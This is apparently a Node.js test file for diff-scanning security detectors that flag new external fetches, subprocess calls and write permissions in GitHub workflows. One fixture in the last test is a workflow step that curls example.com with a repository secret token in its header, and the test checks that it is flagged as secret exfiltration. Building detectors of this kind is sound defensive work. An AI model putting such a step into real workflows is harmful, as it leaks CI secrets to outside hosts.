import test from 'node:test';
import assert from 'node:assert/strict';
import { detectJsCapability } from '../dist/detectors/js-capability.js';
import { detectWorkflowPermissions } from '../dist/detectors/workflow-permissions.js';

test('js detector flags external fetch', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 2,
      content: "  const response = await fetch('https://api.example.com/v1/events');"
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'external_fetch_added');
});

test('js detector downgrades test file subprocess findings', () => {
  const findings = detectJsCapability([
    {
      file: 'src/utils/format.test.ts',
      line: 4,
      content: 'execSync("npm test");'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'subprocess_spawn_added');
  assert.equal(findings[0].severity, 'low');
});

test('workflow detector flags write permissions', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/ci.yml',
      line: 6,
      content: '  contents: write'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'workflow_permission_write');
});

test('workflow detector flags secret exfil pattern', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/deploy.yml',
      line: 18,
      content: 'run: curl https://example.com/hook -H "Authorization: Bearer ${{ secrets.API_TOKEN }}"'
    }
  ]);

  assert.equal(findings.length, 2);
  assert.ok(findings.some((finding) => finding.kind === 'workflow_secret_exfil_pattern'));
});
